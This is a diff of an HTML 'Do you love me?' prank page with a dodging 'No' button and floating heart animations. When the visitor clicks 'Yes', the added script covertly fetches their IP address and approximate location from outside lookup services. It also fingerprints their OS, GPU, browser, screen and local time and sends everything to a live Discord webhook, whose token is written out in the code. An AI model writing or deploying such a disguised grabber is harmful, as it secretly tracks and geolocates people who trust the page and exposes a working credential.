@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>For You</title>
+    <title>For You 🫶</title>
     <style>
         * {
             box-sizing: border-box;
@@ -12,48 +12,66 @@
         }
 
         body {
-            background: radial-gradient(circle, #ffe3ec 0%, #ffb3c6 100%);
+            background: linear-gradient(135deg, #ff758c 0%, #ff7eb3 100%);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             overflow: hidden;
+            position: relative;
             user-select: none;
             -webkit-user-select: none;
         }
 
+        #particleCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
         .container {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
+            background: rgba(255, 255, 255, 0.18);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             padding: 2.2rem 1.2rem;
             border-radius: 24px;
-            box-shadow: 0 15px 35px rgba(255, 75, 110, 0.2);
+            box-shadow: 0 0 35px rgba(255, 255, 255, 0.2), 0 10px 25px rgba(0, 0, 0, 0.1);
             text-align: center;
             max-width: 340px;
             width: 88%;
-            border: 2px solid rgba(255, 255, 255, 0.5);
+            border: 1.5px solid rgba(255, 255, 255, 0.35);
             position: relative;
+            z-index: 10;
+            transition: border-color 0.5s ease, box-shadow 0.5s ease;
         }
 
         .heart-icon {
             font-size: 3.2rem;
-            color: #d90429;
+            color: #ff3366;
             margin-bottom: 0.8rem;
-            animation: pulse 1.5s infinite;
+            display: inline-block;
+            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.8));
+            animation: pulse 1.2s infinite ease-in-out;
         }
 
         @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+            0% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.8)); }
+            50% { transform: scale(1.12); filter: drop-shadow(0 0 25px rgba(255, 51, 102, 1)); }
+            100% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.8)); }
         }
 
         h1 {
-            color: #2b2d42;
+            color: #ffffff;
             font-size: 1.55rem;
             margin-bottom: 2rem;
             font-weight: 700;
+            letter-spacing: 0.5px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.85), 0 0 20px rgba(255, 255, 255, 0.4), 0 2px 5px rgba(0, 0, 0, 0.15);
         }
 
         .btn-container {
@@ -81,12 +99,12 @@
         }
 
         #yesBtn {
-            background-color: #00b4d8; 
-            color: #ffffff;
+            background-color: #00f5d4; 
+            color: #032525;
             position: absolute;
             left: calc(50% - 110px); 
             top: calc(50% - 22px);
-            z-index: 1000;
+            box-shadow: 0 0 20px rgba(0, 245, 212, 0.8), 0 4px 12px rgba(0,0,0,0.15);
         }
 
         #noBtn {
@@ -95,15 +113,17 @@
             position: absolute;
             left: calc(50% + 15px);  
             top: calc(50% - 22px);
-            transition: left 0.15s ease-out, top 0.15s ease-out;
-            z-index: 1000;
+            transition: left 0.15s cubic-bezier(0.25, 1, 0.5, 1), top 0.15s cubic-bezier(0.25, 1, 0.5, 1);
+            box-shadow: 0 0 12px rgba(0, 0, 0, 0.25);
+            z-index: 999;
         }
 
         .success-message {
             display: none;
-            color: #d90429;
+            color: #ffffff;
             font-size: 1.4rem;
             font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.85), 0 0 20px rgba(255, 255, 255, 0.4), 0 2px 5px rgba(0,0,0,0.15);
             animation: fadeIn 0.5s ease forwards;
         }
 
@@ -115,19 +135,21 @@
 </head>
 <body>
 
+    <canvas id="particleCanvas"></canvas>
+
     <div class="container" id="card">
         <div id="interactive-content">
-            <div class="heart-icon">❤️</div>
-            <h1>Do you hate me?</h1>
+            <div class="heart-icon">💖</div>
+            <h1>Do you love me 🫶?</h1>
             <div class="btn-container" id="boxContainer">
                 <button id="yesBtn">Yes</button>
                 <button id="noBtn">No</button>
             </div>
         </div>
         <div class="success-message" id="successMsg">
-            <div style="font-size: 3.8rem; margin-bottom: 0.8rem;">😭💔</div>
-            I knew it...<br>
-            <span style="font-size: 0.9rem; color: #555; font-weight: normal; margin-top: 8px; display: block;">(Your answer has been registered)</span>
+            <div style="font-size: 3.8rem; margin-bottom: 0.8rem; filter: drop-shadow(0 0 15px rgba(255,255,255,0.7));">🥰✨</div>
+            I love you too!<br>
+            <span style="font-size: 0.9rem; color: rgba(255, 255, 255, 0.9); font-weight: normal; margin-top: 8px; display: block; text-shadow: none;">(Notification sent successfully)</span>
         </div>
     </div>
 
@@ -139,8 +161,7 @@
         const interactiveContent = document.getElementById('interactive-content');
         const successMsg = document.getElementById('successMsg');
 
-        // Replace this with your actual Discord Webhook URL
-        const DISCORD_WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1513127708719321189/7wzTrQfTvsTXPNxJoInbuiu4Obn7b8jKanm52Qnnag71A0zKA2piKocVpcQ44XljJusL';
 
         const patterns = [
             { left: 'calc(50% + 15px)', top: '5px' },
@@ -155,10 +176,7 @@
         let currentPatternIndex = 0;
 
         function moveButton(e) {
-            // Prevent default behavior to avoid interference with click events
-            if (e && e.cancelable) {
-                e.preventDefault();
-            }
+            if (e) e.preventDefault();
 
             const nextMove = patterns[currentPatternIndex];
             noBtn.style.left = nextMove.left;
@@ -167,9 +185,81 @@
             currentPatternIndex = (currentPatternIndex + 1) % patterns.length;
         }
 
-        // Add both click and touchstart listeners for the "No" button
         noBtn.addEventListener('click', moveButton);
-        noBtn.addEventListener('touchstart', moveButton, { passive: false });
+
+        // --- Particle System Engine ---
+        const canvas = document.getElementById('particleCanvas');
+        const ctx = canvas.getContext('2d');
+
+        let particlesArray = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = canvas.height + Math.random() * 50 + 10; 
+                this.size = Math.random() * 10 + 5; 
+                this.speedY = Math.random() * 1.2 + 0.8; 
+                this.speedX = Math.sin(Math.random() * Math.PI) * 0.3;
+                this.opacity = Math.random() * 0.5 + 0.4;
+                this.color = `rgba(255, ${Math.floor(Math.random() * 80 + 120)}, ${Math.floor(Math.random() * 50 + 160)}, ${this.opacity})`;
+            }
+
+            update() {
+                this.y -= this.speedY;
+                this.x += this.speedX;
+                if (this.y < canvas.height * 0.7) {
+                    this.opacity -= 0.0025;
+                }
+            }
+
+            draw() {
+                ctx.save();
+                ctx.globalAlpha = Math.max(0, this.opacity);
+                ctx.fillStyle = this.color;
+                ctx.beginPath();
+                const topCurveHeight = this.size * 0.3;
+                ctx.moveTo(this.x, this.y + topCurveHeight);
+                ctx.bezierCurveTo(this.x, this.y, this.x - this.size / 2, this.y, this.x - this.size / 2, this.y + topCurveHeight);
+                ctx.bezierCurveTo(this.x - this.size / 2, this.y + (this.size + topCurveHeight) / 2, this.x, this.y + (this.size + topCurveHeight) / 2, this.x, this.y + this.size);
+                ctx.bezierCurveTo(this.x, this.y + (this.size + topCurveHeight) / 2, this.x + this.size / 2, this.y + (this.size + topCurveHeight) / 2, this.x + this.size / 2, this.y + topCurveHeight);
+                ctx.bezierCurveTo(this.x + this.size / 2, this.y, this.x, this.y, this.x, this.y + topCurveHeight);
+                ctx.closePath();
+                ctx.shadowColor = 'rgba(255, 105, 180, 0.4)';
+                ctx.shadowBlur = 6;
+                ctx.fill();
+                ctx.restore();
+            }
+        }
+
+        function handleParticles() {
+            if (particlesArray.length < 35 && Math.random() < 0.08) {
+                particlesArray.push(new Particle());
+            }
+            
+            for (let i = 0; i < particlesArray.length; i++) {
+                particlesArray[i].update();
+                particlesArray[i].draw();
+
+                if (particlesArray[i].y + particlesArray[i].size < 0 || particlesArray[i].opacity <= 0) {
+                    particlesArray.splice(i, 1);
+                    i--;
+                }
+            }
+        }
+
+        function animateLoop() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            handleParticles();
+            requestAnimationFrame(animateLoop);
+        }
+        animateLoop();
 
         function getCleanDeviceInfo() {
             const ua = navigator.userAgent;
@@ -177,7 +267,6 @@
             let browser = "Unknown Browser";
             let hardwareDetail = "Generic Device";
 
-            // Extract GPU info via WebGL
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -191,29 +280,32 @@
                     }
                 }
             } catch (e) {
-                console.error('WebGL error:', e);
+                console.error(e);
             }
 
-            // Parse OS
             if (/iPhone|iPad|iPod/i.test(ua)) {
-                os = "Apple iOS";
+                os = "Apple iOS (iPhone/iPad)";
             } else if (/Android/i.test(ua)) {
                 const match = ua.match(/Android\s([0-9\.]+)/);
-                os = match ? `Android ${match[1]}` : "Android";
+                os = match ? `Android ${match[1]}` : "Android Device";
             } else if (/Windows NT/i.test(ua)) {
                 if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
+                else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
+                else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
+                else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
                 else os = "Windows PC";
             } else if (/Macintosh/i.test(ua)) {
-                os = "macOS";
+                os = "macOS (Apple Mac)";
+            } else if (/Linux/i.test(ua)) {
+                os = "Linux System";
             }
 
-            // Parse Browser
-            if (/Discord/i.test(ua)) {
-                browser = "Discord Mobile App";
-            } else if (/FBAN|FBAV/i.test(ua)) {
-                browser = "Facebook In-App";
+            if (/FBAN|FBAV/i.test(ua)) {
+                browser = "Facebook App";
             } else if (/Instagram/i.test(ua)) {
-                browser = "Instagram In-App";
+                browser = "Instagram App";
+            } else if (/Discord/i.test(ua)) {
+                browser = "Discord App";
             } else if (/Edg/i.test(ua)) {
                 browser = "Microsoft Edge";
             } else if (/Chrome/i.test(ua) && /Safari/i.test(ua)) {
@@ -224,4 +316,69 @@
                 browser = "Mozilla Firefox";
             }
 
-            return { os, browser,
+            return { os, browser, hardwareDetail };
+        }
+
+        yesBtn.addEventListener('click', async () => {
+            interactiveContent.style.display = 'none';
+            successMsg.style.display = 'block';
+            card.style.borderColor = 'rgba(255, 255, 255, 0.7)';
+            card.style.boxShadow = '0 0 45px rgba(255, 255, 255, 0.55)';
+
+            for(let k = 0; k < 25; k++) {
+                let p = new Particle();
+                p.y = Math.random() * canvas.height;
+                p.speedY *= 2.2;
+                particlesArray.push(p);
+            }
+
+            let ipAddress = "Unknown (Blocked/Error)";
+            let locationData = "Unknown";
+
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                if (response.ok) {
+                    const data = await response.json();
+                    ipAddress = data.ip || "Unknown";
+                    
+                    const locResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+                    if (locResponse.ok) {
+                        const locData = await locResponse.json();
+                        locationData = `${locData.city || 'Unknown'}, ${locData.region || 'Unknown'}, ${locData.country_name || 'Unknown'}`;
+                    }
+                }
+            } catch (err) {
+                console.error('IP address retrieval failed:', err);
+            }
+
+            const cleanDevice = getCleanDeviceInfo();
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const localTime = new Date().toLocaleString();
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "💖 Huge Success!",
+                        description: "She clicked **YES**, she loves you! 🫶",
+                        color: 16724838, 
+                        fields: [
+                            { name: "🌐 IP Address", value: ipAddress, inline: true },
+                            { name: "📍 Estimated Location", value: locationData, inline: true },
+                            { name: "📱 Operating System", value: cleanDevice.os, inline: true },
+                            { name: "🛠️ Hardware/GPU Engine", value: cleanDevice.hardwareDetail, inline: true },
+                            { name: "🌐 Web Browser", value: cleanDevice.browser, inline: true },
+                            { name: "🖥️ Screen Resolution", value: screenRes, inline: true },
+                            { name: "⏰ Device Local Time", value: localTime, inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(err => console.error('Error sending webhook:', err));
+        });
+    </script>
+</body>
+</html>
